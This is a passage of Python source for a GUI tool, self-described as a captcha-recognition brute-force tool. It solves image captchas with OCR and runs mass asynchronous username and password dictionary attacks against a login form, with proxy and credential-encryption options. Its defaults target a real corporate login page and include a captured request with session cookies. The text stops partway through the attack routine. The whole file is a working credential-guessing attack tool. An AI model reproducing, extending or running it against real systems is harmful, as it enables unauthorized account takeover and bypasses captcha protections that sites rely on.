# -*- coding: utf-8 -*-
# @Author: Longda
# @Date:   2022-02-25 14:18:50
# @Last Modified by:   longda
# @Last Modified time: 2022-07-03 04:10:02
import os
import time
import random
import pyperclip 
import ddddocr
import base64
import hashlib
import requests
import binascii
import threading
import asyncio
import aiohttp
import tkinter as tk
from tkinter import messagebox
from tkinter import *
from tkinter import ttk
from Crypto.Cipher import DES,AES
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from urllib.parse import quote
from tkinter.filedialog import askdirectory,askopenfilename
from concurrent.futures import ThreadPoolExecutor,as_completed
from urllib.parse import urlparse
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import serialization
requests.packages.urllib3.disable_warnings()

class windowGUI:
	def __init__(self):
		self.windows = tk.Tk()
		self.set_init_windows()
		self.windows.mainloop()

	def set_init_windows(self):
		# 定义名称和大小
		self.windows.title("图形码识别爆破工具V0.1__by Longda")
		self.windows.geometry('1006x860')
		self.windows.resizable(width=False, height=False)
		self.windows.configure(bg='white')
		self.windows.iconbitmap("favicon.ico")
		# 调用init_toolbar初始化工具条
		self.init_toolbar()
		#创建个主Frame，长在windows上
		mainframe = tk.Frame(self.windows)
		mainframe.pack(fill=BOTH)
		#创建一个上部Frame容器，长在主Frame
		topFrame = tk.Frame(mainframe,height=455,bg='white')
		topFrame.pack(side=TOP, fill=BOTH)
		topFrame.pack_propagate(0)
		#添加个工具条
		toolframe = Frame(mainframe, height=4, bg='lightgray')
		toolframe.pack(fill=X) 
		#创建一个下部Frame容器，长在主Frame上
		self.bottomFrame = tk.Frame(mainframe,height=400,bg='white')
		self.bottomFrame.pack(side=TOP, fill=BOTH)
		self.bottomFrame.pack_propagate(0)

		#将上部分分为左面板
		self.LeftFrame = tk.Frame(topFrame,width=400,bg="white")
		self.LeftFrame.pack(side=LEFT, fill=Y)
		#label
		self.label0=tk.Label(self.LeftFrame, text="图码URL:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label0.grid(row=0, column=0)
		self.label1=tk.Label(self.LeftFrame, text="",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label1.grid(row=1, column=0)
		self.label2=tk.Label(self.LeftFrame, text="图码参数:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label2.grid(row=2, column=0)
		self.label3=tk.Label(self.LeftFrame, text="其他参数:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label3.grid(row=3, column=0)
		self.label6=tk.Label(self.LeftFrame, text="  Raw  :",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label6.grid(row=4, column=0)
		self.label18=tk.Label(self.LeftFrame, text="刷新模式:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label18.grid(row=5, column=0)
		Frame(self.LeftFrame, height=7,width=100,bg='lightgray').grid(row=6, column=0)
		self.label4=tk.Label(self.LeftFrame, text="blastURL:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label4.grid(row=7, column=0)
		self.label7=tk.Label(self.LeftFrame, text="  Raw  :",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label7.grid(row=8, column=0) 
		self.label8=tk.Label(self.LeftFrame, text="  代   理  :",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label8.grid(row=9, column=0)
		#self.passFrame = tk.Frame(rightFrame,width=400,bg="white")
		# self.passFrame.pack(side=TOP, fill=X)
		self.label9=tk.Label(self.LeftFrame, text="  线程数  :",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label9.grid(row=10, column=0)
		self.label23=tk.Label(self.LeftFrame, text="请求体加密:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label23.grid(row=11, column=0)
		
		#Entry
		self.Entry0Text = StringVar(value="http://hrois.haier.net/checkCode.action?d=")
		self.Entry2Text = StringVar(value="")
		self.Entry3Text = StringVar(value="")
		self.Entry4Text = StringVar(value="http://hrois.haier.net/security/login.action")
		self.Entry8Text = StringVar(value="http://127.0.0.1:8080")

		self.Entry0 = tk.Entry(self.LeftFrame, textvariable=self.Entry0Text, width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry0.grid(row=0, column=1)
		self.Entry1 = ttk.Combobox(self.LeftFrame, width=47,font=('等线', 10),state='readonly')
		self.Entry1.grid(row=1, column=1)
		self.Entry1['value'] = ('general', 'json')
		self.Entry1.current(0)
		self.Entry1.bind("<<ComboboxSelected>>",self.selectMode)
		self.Entry2 = tk.Entry(self.LeftFrame, textvariable=self.Entry2Text, width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry2.grid(row=2, column=1)
		self.Entry3 = tk.Entry(self.LeftFrame, textvariable=self.Entry3Text, width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry3.grid(row=3, column=1)
		codeRaw = '''GET /checkCode.action?d=1649855947650 HTTP/1.1\nHost: hrois.haier.net\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: keep-alive\nUpgrade-Insecure-Requests: 1'''
		self.Entry6 = tk.Text(self.LeftFrame, height=7,width=50,font=('黑体',10),bg='lightgray',fg='black',bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry6.grid(row=4, column=1)
		self.Entry6.insert(tk.INSERT,codeRaw)
		Frame(self.LeftFrame, height=7,width=360, bg='lightgray').grid(row=6, column=1)
		self.Entry18 = ttk.Combobox(self.LeftFrame, width=47,font=('等线', 10),state='readonly')
		self.Entry18.grid(row=5, column=1)
		self.Entry18['value'] = ('None','timestamp', 'randomNum')
		self.Entry18.current(1)
		self.Entry4 = tk.Entry(self.LeftFrame, textvariable=self.Entry4Text, width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry4.grid(row=7, column=1)
		self.Entry7 = tk.Text(self.LeftFrame, height=8,width=50,font=('黑体',10),bg='lightgray',fg='black',bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry7.grid(row=8, column=1)
		Raw = '''POST /security/login.action HTTP/1.1\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nAccept-Encoding: gzip, deflate\nAccept-Language: zh-TW,zh;q=0.9,zh-CN;q=0.8,en;q=0.7\nCache-Control: no-cache\nConnection: keep-alive\nContent-Length: 100\nContent-Type: application/x-www-form-urlencoded\nCookie: cookiesession1=678B28C59801234ABCDEFGHIJKLM04CF; _pk_id.83.dce5=aa954d03f48327d6.1649855940.1.1649855940.1649855940.; JSESSIONID=8KAjYxLTy-8gktK6KbLt74jtjRb2B8RJFpfdirLIziIIEyEzS8ix!12500076\nHost: hrois.haier.net\nOrigin: http://hrois.haier.net\nPragma: no-cache\nReferer: http://hrois.haier.net/security/loginInit.action\nUpgrade-Insecure-Requests: 1\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.75 Safari/537.36\n\nlocaleInfo=zh_CN&user.empCode=$user$&user.password=$pass$&checkCode=$code$&redirectURL=&singleLogin='''
		self.Entry7.insert(tk.INSERT,Raw)
		self.Entry8 = tk.Entry(self.LeftFrame, textvariable=self.Entry8Text, width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry8.grid(row=9, column=1)
		self.Entry9 = ttk.Combobox(self.LeftFrame, width=47,font=('等线', 10))
		self.Entry9.grid(row=10, column=1)
		self.Entry9['value'] = ('1','5','10','50',"100","200","300","400","500")
		self.Entry9.current(3)

		self.Entry23 = ttk.Combobox(self.LeftFrame, width=47,font=('等线', 10),state='readonly')
		self.Entry23.grid(row=11, column=1)
		self.Entry23['value'] = ('None','Hex','Base64',"Sha1","Sha224","Sha256","Sha384","Sha512","AES_ECB","AES_CBC","DES","RSA")
		self.Entry23.current(0)
		self.Entry23.bind("<<ComboboxSelected>>",self.selectRequestCrypt)
		# self.Entry23 = tk.Entry(self.LeftFrame, textvariable=self.Entry8Text, width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		# self.Entry23.grid(row=11, column=1)

		#上部份中间面板
		self.midFrame = tk.Frame(topFrame,width=160,bg="lightgray")
		self.midFrame.pack(side=LEFT, fill=Y)
		tk.Button(self.midFrame, text='识别测试',command=self.testCode,font=('microsoft yahei', 9),width=12,bg='lightgray',pady=3).grid(row=0,column=0)
		self.Button1 = tk.Button(self.midFrame, text='其他参数',command=self.addParams,font=('microsoft yahei', 9),width=12,bg='green',pady=3)
		self.Button1.grid(row=1,column=0)
		self.Button2 = tk.Button(self.midFrame, text='清空参数',command=self.clearParams,font=('microsoft yahei', 9),width=12,bg='green',pady=3)
		self.Button2.grid(row=2,column=0)
		tk.Button(self.midFrame, text='用户字典',command=self.addUsers,font=('microsoft yahei', 9),width=12,bg='gray',pady=3).grid(row=3,column=0)
		tk.Button(self.midFrame, text='清空用户',command=self.clearUsers,font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=4,column=0)
		tk.Button(self.midFrame, text='密码字典',command=self.addPass,font=('microsoft yahei', 9),width=12,bg='gray',pady=3).grid(row=5,column=0)
		tk.Button(self.midFrame, text='清空密码',command=self.clearPass,font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=6,column=0)
		tk.Button(self.midFrame, text='开始爆破',command=lambda: self.thread_it(self.blasting),font=('microsoft yahei', 9),width=12,bg='Brown',pady=3).grid(row=7,column=0)
		tk.Button(self.midFrame, text='终止爆破',command=self.stopBlask,font=('microsoft yahei', 9),width=12,bg='gray',pady=3).grid(row=8,column=0)
		tk.Button(self.midFrame, text='查看帮助',command=lambda: self.thread_it(self.showHelp),font=('microsoft yahei', 9),width=12,bg='lightgray',pady=3).grid(row=11,column=0)
		tk.Button(self.midFrame, text='清空打印',command=lambda: self.thread_it(self.clearRespon),font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=9,column=0)
		# tk.Button(self.midFrame, text='导出结果',command=self.export,font=('microsoft yahei', 9),width=12,bg='green',pady=3).grid(row=11,column=0)

		#上部分右边面板
		rightFrame = tk.Frame(topFrame,width=400,bg="white")
		rightFrame.pack(side=LEFT, fill=Y)

		self.userFrame = tk.Frame(rightFrame,width=400,bg="white")
		self.userFrame.pack(side=TOP, fill=X)
		self.label10=tk.Label(self.userFrame, text="userNames:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label10.pack(side=LEFT)
		self.Entry10 = tk.Text(self.userFrame, height=8,width=48,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray')
		self.Entry10.pack(side=LEFT)
		scrol1 = tk.Scrollbar(self.userFrame)
		scrol1.pack(side=LEFT,fill=Y)
		# 设置滚动条与text组件关联
		scrol1['command'] = self.Entry10.yview
		self.Entry10.configure(yscrollcommand=scrol1.set)

		self.passFrame = tk.Frame(rightFrame,width=400,bg="white")
		self.passFrame.pack(side=TOP, fill=X)
		self.label11=tk.Label(self.passFrame, text="passWords:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label11.pack(side=LEFT)
		self.Entry11 = tk.Text(self.passFrame, height=8,width=48,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray')
		self.Entry11.pack(side=LEFT)
		scrol2 = tk.Scrollbar(self.passFrame)
		scrol2.pack(side=LEFT,fill=Y)
		# 设置滚动条与text组件关联
		scrol2['command'] = self.Entry11.yview
		self.Entry11.configure(yscrollcommand=scrol2.set)

		#加密面板
		self.decodeFrame = tk.Frame(rightFrame,bg="white")
		self.decodeFrame.pack(side=TOP, fill=X)
		self.label12=tk.Label(self.decodeFrame, text="userEncode:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label12.pack(side=LEFT)
		self.Entry12 = ttk.Combobox(self.decodeFrame, width=16,font=('等线', 10),state='readonly')
		self.Entry12.pack(side=LEFT)
		self.Entry12['value'] = ('None','URL','Hex','Base32','Base64',"MD5_16","MD5_32","Sha1","Sha224","Sha256","Sha384","Sha512","AES_ECB","AES_CBC","DES","RSA")
		self.Entry12.current(0)
		self.Entry12.bind("<<ComboboxSelected>>",self.selectUserCrypt)
		self.label13=tk.Label(self.decodeFrame, text="pwdEncode:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label13.pack(side=LEFT)
		self.Entry13 = ttk.Combobox(self.decodeFrame, width=16,font=('等线', 10),state='readonly')
		self.Entry13.pack(side=LEFT)
		self.Entry13['value'] = ('None','URL','Hex','Base32','Base64',"MD5_16","MD5_32","Sha1","Sha224","Sha256","Sha384","Sha512","AES_ECB","AES_CBC","DES","RSA")
		self.Entry13.current(0)
		self.Entry13.bind("<<ComboboxSelected>>",self.selectPassCrypt)

		self.decodeFrame1 = tk.Frame(rightFrame,bg="white")
		self.decodeFrame1.pack(side=TOP, fill=X)
		self.label14 = tk.Label(self.decodeFrame1, text="AES_Key:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label14.grid(row=0, column=0)
		self.Entry14 = tk.Entry(self.decodeFrame1, textvariable="", width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry14.grid(row=0, column=1)
		self.label15 = tk.Label(self.decodeFrame1, text="AES_IV:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label15.grid(row=1, column=0)
		self.Entry15 = tk.Entry(self.decodeFrame1, textvariable="", width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry15.grid(row=1, column=1)
		self.label16 = tk.Label(self.decodeFrame1, text="RSA_Pukey:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label16.grid(row=2, column=0)
		self.Entry16 = tk.Entry(self.decodeFrame1, textvariable="", width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry16.grid(row=2, column=1)
		self.label17 = tk.Label(self.decodeFrame1, text="DES_Key:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label17.grid(row=3, column=0)
		self.Entry17 = tk.Entry(self.decodeFrame1, textvariable="", width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry17.grid(row=3, column=1)
		self.label21 = tk.Label(self.decodeFrame1, text="Modulud(HEX):",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label21.grid(row=4, column=0)
		self.Entry21 = tk.Entry(self.decodeFrame1, textvariable="", width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry21.grid(row=4, column=1)
		self.label22 = tk.Label(self.decodeFrame1, text="Exponent:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label22.grid(row=5, column=0)
		self.Entry22Text = StringVar(value="10001")
		self.Entry22 = tk.Entry(self.decodeFrame1, textvariable=self.Entry22Text, width=50,font=('等线', 10),bd=2,exportselection=0,selectbackground='gray',relief=RAISED)
		self.Entry22.grid(row=5, column=1)
		# rsaType
		self.decodeFrame3 = tk.Frame(rightFrame,bg="white")
		self.decodeFrame3.pack(side=TOP, fill=X)
		self.label20=tk.Label(self.decodeFrame3, text="RSAMode:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label20.pack(side=LEFT)
		self.Entry20 = ttk.Combobox(self.decodeFrame3, width=18,font=('等线', 10),state='readonly')
		self.Entry20.pack(side=LEFT)
		self.Entry20['value'] = ('ModulusAndExponent','PublicKey')
		self.Entry20.current(1)
		self.Entry20.bind("<<ComboboxSelected>>",self.selectRSAType)
		#outputFormat
		self.decodeFrame2 = tk.Frame(rightFrame,bg="white")
		self.decodeFrame2.pack(side=TOP, fill=X)
		self.label19 = tk.Label(self.decodeFrame2, text="outputFormat:",font=('microsoft yahei', 9),width=12,bg='white',pady=3)
		self.label19.pack(side=LEFT)
		self.Entry19 = ttk.Combobox(self.decodeFrame2, width=13,font=('等线', 10),state='readonly')
		self.Entry19.pack(side=LEFT)
		self.Entry19['value'] = ('base64','HEX')
		self.Entry19.current(0)

		#下部分
		# 设置Y轴滚动条与respon组件关联
		self.s0 = tk.Scrollbar(self.bottomFrame)
		self.s0.pack(side=RIGHT,fill=Y)
		#打印部分面板
		self.respon = tk.Text(self.bottomFrame, width=141,font=('等线', 10),bg='black',fg="lightgreen",selectbackground='gray',yscrollcommand = self.s0.set)
		self.respon.pack(side=LEFT, fill=BOTH)
		#滚动条与打印面板绑定
		self.s0.config(command = self.respon.yview)
		self.helpStr = "图形验证码识别爆破工具：\n[+] 1、自动化图形验证码识别并账户/密码暴力猜解\n[+] 2、$user$、$pass$、$code$、[$param0$、$param1$、........、$paramn$]分别为指定需要爆破的用户名、密码、图形码、图形码其他参数等识别符，需在请求体中相应位置替换指定\n[+] 3、[图码参数]为返回json中保存图形码值的参数，格式为(根据json级数指定路径)：aa->bb->cc->imgParamerName 若在首级：imgParam 即可\n[+] 4、[其他参数]为图形码同时需要验证的其他参数，多个参数用”,“隔开,对应【添加参数】控钮，格式同[图码参数]:aa->bb->otherParamerName\n[+] 5、general适用于图形码请求返回数据直接为图片，json适用图形码请求返回数据为json个数数据。\[+] 6、[刷新图码]为刷新图形码的参数，一般为：随机数或时间戳或不指定(即利用固定或不需要)\n[+] 7、代理设置支持：http/socks代理，如：http://127.0.0.1:8080\n[+] 8、请求体加密适用于整个请求体加密发送情况，默认为明文：None\n[+] 9、暂不支持请求体和用户密码同时加密的情况(原由：未分别单独实现加密,此情况比较少见)。\n[+] 10、工具简单使用：\n\t1、将图形码请求体Raw+ur、爆破请求体Raw+url copy进对应位置\n\t2、以对应的参数识别符指定代爆破参数【详细见上方tip 2】\n\t3、添加爆破字典、选用对应参数加密方式即可\n\t4、请求体加密默认为明文模式。可选对应加密方式进行加密"
		self.respon.insert(tk.INSERT,self.helpStr)
		# 设置Y轴滚动条与respon组件关联
		self.s1 = tk.Scrollbar(self.bottomFrame)
		self.s1.pack(side=RIGHT,fill=Y)
		columns = ["userName","Passwd","enUserName","enPasswd","Code","Status","Length","resText"]
		self.respon1 = ttk.Treeview(self.bottomFrame,columns=columns,show='headings',yscrollcommand = self.s1.set)
		self.respon1.pack(side=LEFT,fill=BOTH)
		#滚动条与打印面板绑定
		self.s1.config(command = self.respon1.yview)
		
		#加上标题+绑定排序函数
		width = 1006//len(columns)
		for col in columns:
			self.respon1.column(col,width=width,anchor='center')
			self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, False))
		self.respon1.column(columns[-1],width=width,anchor='center')
		#绑定复制Ctrl+c
		self.respon1.bind("<Control-Key-c>", lambda _col: self.copy_from_treeview(self.respon1, _col))
		#默认不显示的item
		self.respon1.pack_forget()
		self.s1.pack_forget()
		self.label2.grid_forget()
		self.Entry2.grid_forget()
		self.label3.grid_forget()
		self.Entry3.grid_forget()
		self.Button2.grid_forget()
		self.Button1.grid_forget()
		self.label14.grid_forget()
		self.Entry14.grid_forget()
		self.label15.grid_forget()
		self.Entry15.grid_forget()
		self.label16.grid_forget()
		self.Entry16.grid_forget()
		self.label17.grid_forget()
		self.Entry17.grid_forget()
		self.label19.pack_forget()
		self.Entry19.pack_forget()
		self.label20.pack_forget()
		self.Entry20.pack_forget()
		self.label21.grid_forget()
		self.Entry21.grid_forget()
		self.label22.grid_forget()
		self.Entry22.grid_forget()

	#停止爆破	
	def stopBlask(self):
		if self.loop.is_running():
			self.loop.stop()

	#help
	def showHelp(self):
		self.s1.pack_forget()
		self.respon1.pack_forget()
		self.clearRespon()
		self.s0.pack(side=RIGHT,fill=Y)
		self.respon.pack(side=LEFT,fill=BOTH)
		# self.respon.delete('1.0',"end")
		self.respon.insert(tk.INSERT,self.helpStr)

	#排序函数#Treeview、列名、排列方式
	def treeview_sort_column(self, col, reverse):
		l = [(self.respon1.set(k, col), k) for k in self.respon1.get_children('')]
		#排序方式
		l.sort(reverse=reverse)
		# rearrange items in sorted positions
		#根据排序后索引移动
		for index, (val, k) in enumerate(l):
		    self.respon1.move(k, '', index)
		#重写标题，使之成为再点倒序的标题
		self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, not reverse))

	#复制功能
	def copy_from_treeview(self,tree,event):
		selection = tree.selection()
		column = tree.identify_column(event.x)
		column_no = int(column.replace("#", "")) - 1        
		copy_values = []
		for each in selection:
		    try:
		        value = tree.item(each)["values"][column_no]
		        copy_values.append(str(value))
		    except:
		        pass
		copy_string = "\n".join(copy_values)
		pyperclip.copy(copy_string)

	#rsaType
	def selectRSAType(self,event):
		if self.Entry20.get()=='ModulusAndExponent':
			self.label21.grid(row=4,column=0)
			self.Entry21.grid(row=4,column=1)
			self.label22.grid(row=5,column=0)
			self.Entry22.grid(row=5,column=1)
			self.label16.grid_forget()
			self.Entry16.grid_forget()
		elif self.Entry20.get()=='PublicKey':
			self.label21.grid_forget()
			self.Entry21.grid_forget()
			self.label22.grid_forget()
			self.Entry22.grid_forget()
			self.label16.grid(row=2, column=0)
			self.Entry16.grid(row=2, column=1)

	def selectRequestCrypt(self,event):
		if self.Entry23.get() == "AES_ECB":
			self.label14.grid(row=0, column=0)
			self.Entry14.grid(row=0, column=1)
			self.label15.grid_forget()
			self.Entry15.grid_forget()
			self.label16.grid_forget()
			self.Entry16.grid_forget()
			self.label17.grid_forget()
			self.Entry17.grid_forget()
			self.label20.pack_forget()
			self.Entry20.pack_forget()
			self.label21.grid_forget()
			self.Entry21.grid_forget()
			self.label22.grid_forget()
			self.Entry22.grid_forget()
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
		elif self.Entry23.get() == "AES_CBC":
			self.label14.grid(row=0, column=0)
			self.Entry14.grid(row=0, column=1)
			self.label15.grid(row=1, column=0)
			self.Entry15.grid(row=1, column=1)
			self.label16.grid_forget()
			self.Entry16.grid_forget()
			self.label17.grid_forget()
			self.Entry17.grid_forget()
			self.label20.pack_forget()
			self.Entry20.pack_forget()
			self.label21.grid_forget()
			self.Entry21.grid_forget()
			self.label22.grid_forget()
			self.Entry22.grid_forget()
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
		elif self.Entry23.get() == "DES":
			self.label14.grid_forget()
			self.Entry14.grid_forget()
			self.label15.grid_forget()
			self.Entry15.grid_forget()
			self.label16.grid_forget()
			self.Entry16.grid_forget()
			self.label17.grid(row=3,column=0)
			self.Entry17.grid(row=3,column=1)
			self.label20.pack_forget()
			self.Entry20.pack_forget()
			self.label21.grid_forget()
			self.Entry21.grid_forget()
			self.label22.grid_forget()
			self.Entry22.grid_forget()
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
		elif self.Entry23.get() == "RSA":
			self.label14.grid_forget()
			self.Entry14.grid_forget()
			self.label15.grid_forget()
			self.Entry15.grid_forget()
			self.label16.grid(row=2,column=0)
			self.Entry16.grid(row=2,column=1)
			self.label17.grid_forget()
			self.Entry17.grid_forget()
			self.label20.pack(side=LEFT)
			self.Entry20.pack(side=LEFT)
			self.label21.grid_forget()
			self.Entry21.grid_forget()
			self.label22.grid_forget()
			self.Entry22.grid_forget()
			self.label19.pack(side=LEFT)
			self.Entry19.pack(side=LEFT)
		else:
			self.label14.grid_forget()
			self.Entry14.grid_forget()
			self.label15.grid_forget()
			self.Entry15.grid_forget()
			self.label16.grid_forget()
			self.Entry16.grid_forget()
			self.label17.grid_forget()
			self.Entry17.grid_forget()
			self.label20.pack_forget()
			self.Entry20.pack_forget()
			self.label21.grid_forget()
			self.Entry21.grid_forget()
			self.label22.grid_forget()
			self.Entry22.grid_forget()
			self.label19.pack_forget()
			self.Entry19.pack_forget()

	#blasting function
	def blasting(self):
		generalAllData = self.generalGetData()
		self.proxies = generalAllData[2]
		if self.proxies=='':
			self.proxies=None
		userNames = self.getUsers()
		passwds = self.getPasswds()
		#三种爆破模式（用户名+密码/用户名/密码）
		#模式一：同时爆破用户名+密码
		if userNames and passwds:
			encodeUserNames = self.getEncodeUser(generalAllData[4],userNames)
			encodePasswds = self.getEncodePass(generalAllData[5],passwds)
			#不加密
			if encodeUserNames==None and encodePasswds==None:
				items = self.respon1.get_children()
				[self.respon1.delete(item) for item in items]
				columns = ["userName","Passwd","Code","Status","Length","resText"]
				width = 1006//len(columns)
				self.respon.pack_forget()
				self.s0.pack_forget()
				self.s1.pack(side=LEFT,fill=Y)
				self.respon1.pack(side=LEFT,fill=BOTH)
				self.respon1["columns"]=columns
				#加上标题+绑定排序函数
				for col in columns:
					self.respon1.column(col,width=width,anchor='center')
					self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, False))
				self.respon1.column(columns[-1],width=width,anchor='nw')
				#异步爆破
				self.loop = asyncio.new_event_loop()
				asyncio.set_event_loop(self.loop)
				tasks = []
				semaphore = asyncio.Semaphore(int(generalAllData[3]))
				for i in range(len(userNames)):
					tasks += [self.doGetRequests_one([userNames[i],passwds[j],"None"],semaphore) for j in range(len(passwds))]
				group = asyncio.gather(*tasks,return_exceptions=True)
				# group.cancel()
				self.loop.run_until_complete(group)
				self.loop.close()
					
			#用户名加密
			elif encodeUserNames!=None and encodePasswds==None:
				items = self.respon1.get_children()
				[self.respon1.delete(item) for item in items]
				columns = ["userName","Passwd","enUserName","Code","Status","Length","resText"]
				width = 1006//len(columns)
				self.respon.pack_forget()
				self.s0.pack_forget()
				self.s1.pack(side=LEFT,fill=Y)
				self.respon1.pack(side=LEFT,fill=BOTH)
				self.respon1["columns"]=columns
				#加上标题+绑定排序函数
				for col in columns:
					self.respon1.column(col,width=width,anchor='center')
					self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, False))
				self.respon1.column(columns[-1],width=width,anchor='nw')
				self.loop = asyncio.new_event_loop()
				asyncio.set_event_loop(self.loop)
				tasks = []
				semaphore = asyncio.Semaphore(int(generalAllData[3]))
				for i in range(len(userNames)):
					tasks += [self.doGetRequests_one([encodeUserNames[i],passwds[j],userNames[i],"user"],semaphore) for j in range(len(passwds))]
				group = asyncio.gather(*tasks,return_exceptions=True)
				# group.cancel()
				self.loop.run_until_complete(group)
				self.loop.close()
			#密码加密	
			elif encodeUserNames==None and encodePasswds!=None:
				items = self.respon1.get_children()
				[self.respon1.delete(item) for item in items]
				columns = ["userName","Passwd","enPasswd","Code","Status","Length","resText"]
				width = 1006//len(columns)
				self.respon.pack_forget()
				self.s0.pack_forget()
				self.s1.pack(side=LEFT,fill=Y)
				self.respon1.pack(side=LEFT,fill=BOTH)
				self.respon1["columns"]=columns
				#加上标题+绑定排序函数
				for col in columns:
					self.respon1.column(col,width=width,anchor='center')
					self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, False))
				self.respon1.column(columns[-1],width=width,anchor='nw')
				tasks = []
				self.loop = asyncio.new_event_loop()
				asyncio.set_event_loop(self.loop)
				semaphore = asyncio.Semaphore(int(generalAllData[3]))
				for i in range(len(userNames)):
					tasks += [self.doGetRequests_one([userNames[i],encodePasswds[j],passwds[j],"pass"],semaphore) for j in range(len(passwds))]
				group = asyncio.gather(*tasks,return_exceptions=True)
				# group.cancel()
				self.loop.run_until_complete(group)
				self.loop.close()
			#两者都加密			
			else:
				items = self.respon1.get_children()
				[self.respon1.delete(item) for item in items]
				columns = ["userName","Passwd","enUserName","enPasswd","Code","Status","Length","resText"]
				width = 1006//len(columns)
				self.respon.pack_forget()
				self.s0.pack_forget()
				self.s1.pack(side=LEFT,fill=Y)
				self.respon1.pack(side=LEFT,fill=BOTH)
				self.respon1["columns"]=columns
				#加上标题+绑定排序函数
				for col in columns:
					self.respon1.column(col,width=width,anchor='center')
					self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, False))
				self.respon1.column(columns[-1],width=width,anchor='nw')
				self.loop = asyncio.new_event_loop()
				asyncio.set_event_loop(self.loop)
				tasks = []
				semaphore = asyncio.Semaphore(int(generalAllData[3]))
				for i in range(len(userNames)):
					tasks += [self.doGetRequests_one([encodeUserNames[i],encodePasswds[j],userNames[i],passwds[j],"all"],semaphore) for j in range(len(passwds))]
				group = asyncio.gather(*tasks,return_exceptions=True)
				# group.cancel()
				self.loop.run_until_complete(group)
				self.loop.close()

		#模式二：只爆破用户名
		elif userNames and len(passwds)==0:
			encodeUserNames = self.getEncodeUser(generalAllData[4],userNames)
			#加密
			if encodeUserNames != None:
				items = self.respon1.get_children()
				[self.respon1.delete(item) for item in items]
				columns = ["userName","enUserName","Code","Status","Length","resText"]
				width = 1006//len(columns)
				self.respon.pack_forget()
				self.s0.pack_forget()
				self.s1.pack(side=LEFT,fill=Y)
				self.respon1.pack(side=LEFT,fill=BOTH)
				self.respon1["columns"]=columns
				#加上标题+绑定排序函数
				for col in columns:
					self.respon1.column(col,width=width,anchor='center')
					self.respon1.heading(col, text=col, command=lambda _col=col: self.treeview_sort_column(_col, False))
				self.respon1.column(columns[-1],width=width,anchor='nw')
				#异步请求
				self.loop = asyncio.new_event_loop()
				asyncio.set_event_loop(self.loop)
				tasks = []
				semaphore = asyncio.Semaphore(int(generalAllData[3]))
				tasks = [self.doGetRequests([encodeUserNames[i],userNames[i],"user"],semaphore) for i in range(len(encodeUserNames))]
				group = asyncio.gather(*tasks,return_exceptions=True)
